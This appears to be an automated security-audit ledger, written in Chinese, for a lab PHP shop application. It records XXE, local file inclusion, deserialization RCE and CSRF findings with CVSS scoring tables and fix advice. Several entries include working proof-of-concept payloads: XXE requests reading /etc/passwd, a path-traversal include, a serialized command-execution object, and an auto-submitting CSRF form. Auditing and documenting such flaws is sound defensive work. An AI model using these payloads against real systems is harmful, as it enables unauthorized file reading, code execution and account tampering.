可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'jobs_rce_poc.php', 'language': 'php', 'script': "<?php\nclass DispatchJob { public string $command = 'id'; }\necho base64_encode(serialize(new DispatchJob()));\n", 'instructions': '运行脚本得到 base64 载荷，携带登录会话与页面 csrf token，POST 至 /ops/jobs.php 的 job 字段', 'normal_input': 'job=（默认 printf inventory-ready 的序列化数据）', 'attack_input': "base64(serialize(DispatchJob{command:'id'}))", 'expected_result': '正常输入输出 inventory-ready；攻击输入在页面 pre 中回显 id 命令结果'}
````


### 台账 `7905401b64084de6956b3ecd7b67e0a9`

- 运营 XML 导入启用 LIBXML_NOENT|LIBXML_DTDLOAD 导致 XXE 与实体扩展（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:L，验证：unverified）
  来源 `f0c32f14866146c0b243c51bc69831a7` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/xml-import.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 40, 'end_line': 40}]
  结论：xml-import.php:3 从 $_POST['xml'] 取得原始 XML，直接 simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT|LIBXML_DTDLOAD)。LIBXML_DTDLOAD 加载外部 DTD，LIBXML_NOENT 替换实体，使攻击者可定义外部实体引用 file:///... 并由 :4 输出 $doc->title 回显内容；同时可定义递归实体触发实体扩展 DoS。未见禁用网络/文件实体或限制实体扩展长度的防护。
  输入：POST 参数 xml
  传播：xml-import.php:3 $_POST['xml'] -> (string) -> simplexml_load_string(...LIBXML_NOENT|LIBXML_DTDLOAD) -> $doc->title 在 :4 经 h() 输出
  危险操作：simplexml_load_string 加载外部 DTD 并替换实体
  保护：require_user(['operator','admin']) 与 check_csrf() 存在，但 XML 解析选项无实体防护
  前提：['攻击者持有 operator 或 admin 角色会话及有效 CSRF token']
  修复建议：使用 LIBXML_NONET 并移除 LIBXML_NOENT/LIBXML_DTDLOAD，或解析前显式禁用外部实体与实体替换，限制实体扩展。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:27:17.444081+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP POST 访问 /ops/xml-import.php | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造带外部实体或 DTD 的 XML 并 POST | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 限定 operator/admin 角色，需低权限账号 | lab30-shop/app/public/ops/xml-import.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者直接提交 POST 请求 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 解析在同一 PHP 进程内，影响服务器端文件读取与解析资源 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 外部实体可读取服务器本地文件并回显 title | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取，未发现写入操作 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 实体扩展可造成解析资源消耗/拒绝服务 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'xxe_xml_import.sh', 'language': 'bash', 'script': 'curl -s \'http://TARGET/ops/xml-import.php\' -b \'SHOPSESSID=VALID\' -c cookies.txt > /tmp/page.html\nCSRF=$(grep -o \'name="csrf" value="[^"]*"\' /tmp/page.html | sed \'s/.*value="//;s/"//\')\ncurl -s \'http://TARGET/ops/xml-import.php\' -b \'SHOPSESSID=VALID\' --data-urlencode "csrf=$CSRF" --data-urlencode \'xml=<?xml version="1.0"?><!DOCTYPE c [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><title>&xxe;</title></config>\'', 'instructions': '以具备 operator/admin 权限的会话登录目标，替换 TARGET 与 SHOPSESSID，先获取 csrf 再提交实体引用 XML。', 'normal_input': '<config><title>春日上新</title></config>', 'attack_input': '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><title>&xxe;</title></config>', 'expected_result': '正常输入显示“春日上新”，攻击输入在导入结果中显示 /etc/passwd 内容或解析错误暗示外部实体被处理。'}
````

- 运营 XML 导入启用 LIBXML_NOENT|LIBXML_DTDLOAD 导致 XXE 与实体扩展（CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L，验证：unverified）
  来源 `7b5a983f21c746bba9df968664fb8acb` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/xml-import.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：第3行从 $_POST['xml'] 获取攻击者可控 XML，并调用 simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT|LIBXML_DTDLOAD)。LIBXML_DTDLOAD 加载外部 DTD，LIBXML_NOENT 替换实体，未禁用外部实体加载，也无实体扩展限制，外部实体与实体膨胀可达。第4行仅将 $doc->title 转义输出，说明 XXE 影响不依赖回显，但能说明解析阶段无限实体。
  输入：$_POST['xml']
  传播：第3行赋值 $xml=(string)($_POST['xml']??'') 后直接传入 simplexml_load_string，选项 LIBXML_NOENT|LIBXML_DTDLOAD
  危险操作：simplexml_load_string 以允许外部实体替换与外部 DTD 加载的选项解析不可信 XML
  保护：require_user(['operator','admin']) 与 check_csrf() 限制调用者与请求来源，但不限制 XML 实体解析；libxml_use_internal_errors(true) 只抑制告警
  前提：['具有 operator 或 admin 会话且通过 CSRF 提交；运行时 libxml 外部实体加载未被其他全局配置禁用（未在已读源码中发现 libxml_disable_entity_loader 或全局选项）']
  修复建议：解析时使用 LIBXML_NONET，不要使用 LIBXML_NOENT/LIBXML_DTDLOAD；按需禁用外部实体与 DTD，限制实体扩展并使用安全的 schema 解析。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:27:49.248319+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 入口通过 HTTP 访问 | lab30-shop/app/public/ops/xml-import.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 提交构造的 XML 即可触发 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator 或 admin 角色 | lab30-shop/app/public/ops/xml-import.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行提交 POST | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于解析进程资源与读取可达内容 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 外部实体可读取本地/服务端资源，具体范围未验证 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 解析过程不直接修改数据 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 实体扩展可消耗解析资源 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。

- 运营 XML 导入启用 LIBXML_NOENT|LIBXML_DTDLOAD 导致 XXE 与实体扩展（CVSS 3.1 Base 5.9 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:L，验证：unverified）
  来源 `29e9987b4a9c4a6bbc7f272ed524d726` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/xml-import.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：xml-import.php 第3行将用户可控的 $_POST['xml'] 传给 simplexml_load_string，并显式传入 LIBXML_NOENT|LIBXML_DTDLOAD：LIBXML_NOENT 会替换 XML 实体，LIBXML_DTDLOAD 会加载外部 DTD。攻击者可构造带外部实体/参数实体的 XML，使解析器读取本地文件或内网资源，经 $doc->title 进入第4行 h($output) 输出；未设置 LIBXML_NONET 或实体白名单，实体扩展还可造成解析资源消耗。
  输入：$_POST['xml']（第3行）
  传播：第3行 $xml=(string)($_POST['xml']??'') → simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT|LIBXML_DTDLOAD) → $doc->title → $output → 第4行 h($output) 页面输出
  危险操作：启用 LIBXML_NOENT 与 LIBXML_DTDLOAD 的 SimpleXML 解析
  保护：require_user(['operator','admin']) 与 check_csrf() 控制访问，但不能阻止已登录运营用户提交恶意 XML；h() 仅输出转义，不限制实体解析
  前提：['攻击者需持有 operator 或 admin 会话及有效 CSRF token；目标 libxml 允许外部实体加载']
  修复建议：解析不可信 XML 时避免 LIBXML_NOENT|LIBXML_DTDLOAD，使用 LIBXML_NONET，禁用外部实体/DTD，或改用不展开实体的解析配置；对导入内容做结构白名单校验。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:28:52.858433+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST 入口可从网络访问 | lab30-shop/app/public/ops/xml-import.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需构造有效 XML/DTD 且受 xml 参数解析与实体加载条件影响 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求已登录的 operator 或 admin 角色 | lab30-shop/app/public/ops/xml-import.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身可发起 POST 并提交 CSRF token | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 解析在应用进程内进行，未证明授权边界改变 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 外部实体可读取服务器本地文件或内网资源并输出至页面 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 未见解析结果被写入或修改持久化数据 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 实体扩展/递归 DTD 可能消耗解析资源；影响程度未在源码中量化 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'xxe_xml_import.php', 'language': 'php', 'script': '<?php\n// 手工审阅用：替换 BASE、CSRF、Cookie 后运行\n$url=\'http://TARGET/ops/xml-import.php\';\n$xml=\'<?xml version="1.0"?><!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><title>&xxe;</title></config>\';\n$ch=curl_init($url);\ncurl_setopt_array($ch,[CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>http_build_query([\'csrf\'=>\'CSRF_TOKEN\',\'xml\'=>$xml]),CURLOPT_HTTPHEADER=>[\'Cookie: SHOPSESSID=SESSION_ID\'],CURLOPT_RETURNTRANSFER=>true]);\n$r=curl_exec($ch);echo $r;\n', 'instructions': '以 operator/admin 登录获取 SHOPSESSID，提取页面 csrf token 与表单，替换 TARGET、CSRF_TOKEN、SESSION_ID 后向 /ops/xml-import.php 提交 XML。控制组提交 <config><title>春日上新</title></config>。', 'normal_input': '<config><title>春日上新</title></config>', 'attack_input': '<?xml version="1.0"?><!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><title>&xxe;</title></config>', 'expected_result': '控制组只显示“春日上新”；攻击组响应中的导入结果 pre 显示 /etc/passwd 内容，证明外部实体被展开读取。'}
````

- 运营 XML 导入启用 LIBXML_NOENT|LIBXML_DTDLOAD 导致 XXE 与实体扩展（CVSS 3.1 Base 5.0 (medium) · CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:L，验证：unverified）
  来源 `32471343a1ff4a669c2537dd0a44dce4` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/xml-import.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 40, 'end_line': 40}]
  结论：第3行从 $_POST['xml'] 取值并调用 simplexml_load_string，参数中显式 LIBXML_NOENT|LIBXML_DTDLOAD，允许加载外部 DTD 并替换外部实体。攻击者以 operator/admin 身份提交含外部实体引用的 XML，可读取服务器端本地文件或引入外部资源；第4行将解析后的 title 经 h() 回显，实体内容会进入响应。未见禁用外部实体的配置。
  输入：POST 参数 xml
  传播：$_POST['xml'] -> $xml -> simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT|LIBXML_DTDLOAD) -> $doc->title -> 页面 pre 回显
  危险操作：simplexml_load_string 启用 LIBXML_NOENT|LIBXML_DTDLOAD，解析外部 DTD/实体
  保护：require_user(['operator','admin']) 限制角色；check_csrf() 限制跨站提交；h() 仅转义输出，不能阻止实体解析。
  前提：['攻击者需持有 operator 或 admin 会话及有效 CSRF token；运行环境的 libxml/PHP 配置允许加载外部实体并支持相应协议。']
  修复建议：移除 LIBXML_NOENT 与 LIBXML_DTDLOAD，使用 LIBXML_NONET，并在可能时通过 libxml_disable_entity_loader(true) 或解析前拒绝 DOCTYPE 禁止外部实体；限制实体扩展与输入大小。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:29:34.829283+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口通过 POST 请求触发 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需构造外部 DTD 与实体引用；实际文件读取/外带依赖部署与解析器行为 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | H | 入口要求 operator 或 admin 角色 | lab30-shop/app/public/ops/xml-import.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身提交 XML 即触发 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 未见授权边界改变证据 | lab30-shop/app/public/ops/xml-import.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 外部实体可引用本地文件并渲染到页面；实际读取能力依赖部署 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 未发现文件写入或数据变更路径 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 实体扩展可能消耗解析资源；缺少运行时限制证据 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'xxe_xml_import.txt', 'language': 'text', 'script': '<!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><title>&xxe;</title></config>', 'instructions': '以 operator/admin 登录取得会话与页面 CSRF token，将该内容作为 xml 参数 POST 到 /ops/xml-import.php，观察导入结果 pre 中是否出现 /etc/passwd 内容。', 'normal_input': '<config><title>春日上新</title></config>', 'attack_input': '<!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><title>&xxe;</title></config>', 'expected_result': '正常输入回显“春日上新”；攻击输入在导入结果中回显本地文件内容，证明外部实体被展开。'}
````

- 运营 XML 导入显式启用 LIBXML_NOENT 与 LIBXML_DTDLOAD 导致 XXE（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:L，验证：unverified）
  来源 `0b54858aefc84457a9f4ba7b1f8a577e` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/xml-import.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：第 3 行将 POST xml 传入 simplexml_load_string，选项为 LIBXML_NOENT|LIBXML_DTDLOAD：前者替换实体，后者加载外部 DTD。攻击者可构造带外部实体引用的 XML，使解析器读取本地文件并作为 title 返回。
  输入：POST 参数 xml
  传播：$_POST['xml'] -> simplexml_load_string(..., LIBXML_NOENT|LIBXML_DTDLOAD) -> $doc->title -> h($output) 输出
  危险操作：simplexml_load_string 在启用 LIBXML_NOENT 与 LIBXML_DTDLOAD 下解析不可信 XML
  保护：仅 require_user(['operator','admin']) 与 check_csrf；无禁用外部实体或安全解析选项
  前提：['攻击者拥有 operator 或 admin 账号并通过 CSRF 校验；PHP/libxml 支持 DTD 与外部实体']
  修复建议：移除 LIBXML_NOENT 与 LIBXML_DTDLOAD，使用 LIBXML_NONET，并在解析前禁止 DTD/外部实体；必要时改用白名单结构化导入。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:30:28.747768+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST 入口可由网络访问 | lab30-shop/app/public/ops/xml-import.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 提交构造 XML 即可触发解析选项 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要 operator 或 admin 角色登录 | lab30-shop/app/public/ops/xml-import.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行提交请求 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 实体读取影响解析进程所在范围，未证明授权边界改变 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 外部实体可读取本地文件内容并回显为 title | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 未发现写入或修改数据 | lab30-shop/app/public/ops/xml-import.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 实体扩展可能导致解析资源消耗 | lab30-shop/app/public/ops/xml-import.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `5f8a819f26e14990a4204f0220c29672`

- content/page.php 中 page 参数未过滤直接拼接 include 造成本地文件包含（CVSS 3.1 Base 8.2 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N，验证：unverified）
  来源 `987419cf746d405990fe4934bd5d7986` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/content/page.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/resources/views/home.php', 'start_line': 1, 'end_line': 1}, {'path': 'lab30-shop/app/resources/views/shipping.php', 'start_line': 1, 'end_line': 1}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 40, 'end_line': 40}]
  结论：index 入口将 $_GET['page'] 原样拼入 include 路径 APP_ROOT.'/resources/views/'.$name.'.php'，无白名单、无 basename、无路径规范化，攻击者可用 ../ 序列跳出 views 目录包含任意 .php 文件（如 ../../public/account/backup.php 等），也可借助路径截断外的现有文件实现代码执行或敏感逻辑触发。home.php/shipping.php 本身虽静态，但正是同一拼接点的合法取值，说明该入口承担视图加载职责。
  输入：HTTP GET 参数 page（content/page.php:2）
  传播：page.php:2 $name=(string)($_GET['page']??'home') → page.php:3 include APP_ROOT.'/resources/views/'.$name.'.php'
  危险操作：include 动态文件路径（page.php:3）
  保护：无任何过滤：既未校验 page ∈ {home, shipping} 白名单，也未使用 basename/realpath 约束在 views 目录内；bootstrap.php 的 h()/csrf 与此路径拼接无关。
  前提：['攻击者能访问 /content/page.php（无需登录，require_user 未被调用），且目标文件在快照内存在。']
  修复建议：使用严格白名单：$allowed=['home','shipping']; if(!in_array($name,$allowed,true)) fail_request(...,404); 并以固定路径 include APP_ROOT.'/resources/views/'.$name.'.php'，禁止直接拼入用户输入。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:28:09.699232+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 请求 content/page.php | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造 page=../../ 相对路径参数，无需特殊条件 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | content/page.php 未调用 require_user，匿名可访问 | lab30-shop/app/public/content/page.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身发起请求即可触发 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 包含文件在同一 PHP 进程与权限内执行，未跨越授权边界 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取并执行快照内任意 .php 文件，其输出与配置（含 bootstrap.php 中的凭证默认值）可被回显 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 被包含文件的副作用代码可能被执行，但非任意写入 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 源码未显示可导致服务不可用的操作 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'lfi_page_include.sh', 'language': 'bash', 'script': "curl -s -b cookies.txt 'http://TARGET/content/page.php?page=../../account/profile'", 'instructions': '目标入口 URL：/content/page.php。先 GET /content/page.php?page=shipping 作为对照，正常返回配送说明；再请求 page=../../public/account/profile 等相对路径，观察返回内容是否变为被包含文件输出而非视图文案。', 'normal_input': 'page=home', 'attack_input': 'page=../../public/account/profile', 'expected_result': '对照请求返回 home.php 静态文本；攻击请求返回 account/profile.php 内部逻辑输出（个人主页预览页面），证明 include 路径可跳出 views 目录。'}
````


### 台账 `7ad3c684a4d54adb899e29e34e560d5e`

- 账户邮箱设置 POST 更新缺少 CSRF 令牌与服务端校验（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `90019dda6afe4b5a805298d98e3f2c44` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/settings.php', 'start_line': 3, 'end_line': 8}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 38, 'end_line': 40}, {'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 4, 'end_line': 4}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 4, 'end_line': 4}]
  结论：settings.php 的 POST 分支直接读取 $_POST['email'] 并执行 UPDATE users SET email=?，表单与处理逻辑均未使用 csrf_field()/check_csrf()。bootstrap.php:38-40 提供了 CSRF 机制，backup.php:4 与 update.php:4 均调用 check_csrf()，说明该处保护缺失。攻击者可用跨站表单以受害者身份修改绑定邮箱。
  输入：跨站 POST 请求中的 email 参数
  传播：settings.php:3 判断 POST → 第4行读取 $_POST['email'] → 第5行 UPDATE users
  危险操作：UPDATE users SET email=? WHERE id=?
  保护：无：表单无 csrf_field()，处理逻辑无 check_csrf()
  前提：['受害者已登录并访问攻击者页面；会话 Cookie 为 samesite=Lax，但顶层 POST 导航在多数浏览器中仍会携带，且攻击者可用 GET 表单或同站子域方式触发']
  修复建议：在表单中加入 csrf_field()，并在 POST 处理起始调用 check_csrf()。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:29:56.640224+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 攻击者可通过网页诱使受害者浏览器发起请求 | lab30-shop/app/public/account/settings.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造一个 POST 表单，无需特殊条件 | lab30-shop/app/public/account/settings.php:3-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 未认证攻击者即可投放 CSRF 页面 | lab30-shop/app/public/account/settings.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者已登录并访问恶意页面 | lab30-shop/app/src/bootstrap.php:33-34 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于受害者账户自身资料 | lab30-shop/app/public/account/settings.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 不泄露数据 | lab30-shop/app/public/account/settings.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可篡改受害者账户邮箱 | lab30-shop/app/public/account/settings.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不影响可用性 | lab30-shop/app/public/account/settings.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'csrf_update_email.html', 'language': 'html', 'script': '<form action="http://target/account/settings.php" method="POST"><input name="email" value="attacker@example.com"><button>go</button></form><script>document.forms[0].submit()</script>', 'instructions': '受害者登录后访问该页面，观察账户邮箱被改为 attacker@example.com', 'normal_input': '在 settings.php 正常提交合法邮箱', 'attack_input': 'email=attacker@example.com', 'expected_result': '受害者账户邮箱被跨站修改为 attacker@example.com'}
````

- 邮箱设置 POST 缺少 CSRF 令牌与服务端校验（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `2e75f5f05add4f9bac345c3811e6af0a` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/settings.php', 'start_line': 3, 'end_line': 8}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 38, 'end_line': 40}]
